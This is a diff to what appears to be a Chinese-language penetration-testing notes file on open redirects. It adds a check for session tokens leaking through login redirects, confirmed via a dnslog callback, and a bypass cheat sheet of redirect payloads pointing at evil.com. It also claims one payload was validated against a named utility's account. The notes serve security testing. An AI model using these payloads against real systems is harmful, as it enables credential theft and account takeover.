@@ -1,4 +1,22 @@
 # §24 Open Redirect
+### 凭据外带检查（跳转类漏洞的危害升级位, 2026-08 实战）
+
+登录/鉴权跳转的回链必须**逐字符审计**: token/ticket/code/sessionId 拼在跳转 URL 的
+query 里 = 可外带。验证: 跳转 url 参数改 dnslog → 完成登录 → dnslog 收包 = 凭据劫持成立
+(普通跳转=中危; 跳转+凭据外带=高危, 直接账号接管)。
+发现手法: 最平凡的交互(点赞/收藏/分享)触发的跳转也要保存地址逐段比对。
+
+### 绕过技法速查（含 @ 同源锁绕过，2026-08 实战）
+
+Location 拼接形态不同，绕过方式不同（依次尝试）:
+- 直接外域: `redirectUrl=https://evil.com`
+- 协议相对: `//evil.com` / `///evil.com`
+- **同源路径反射** `Location: https://{domain}/{path}` → `pathName=@evil.com`
+  （@ 前变 userinfo，真实 host = evil.com——2026-08 国网重庆公众号实战验证）
+- 编码变体: `..%2f` / `%2f%2fevil.com` / `%09evil.com`
+- 白名单前缀: `https://{trusted}.evil.com` / `https://{trusted}evil.com`
+- 符号拼接: `https:{trusted}.evil.com` / `//{trusted}.evil.com`
+
 ### 识别信号
 - 参数：`redirect` `next` `return` `goto` `redirectUrl` `redirect_uri` `callback` `target` `continue` `back`
 - 302/301 响应码 + `Location` 头指向参数指定的 URL
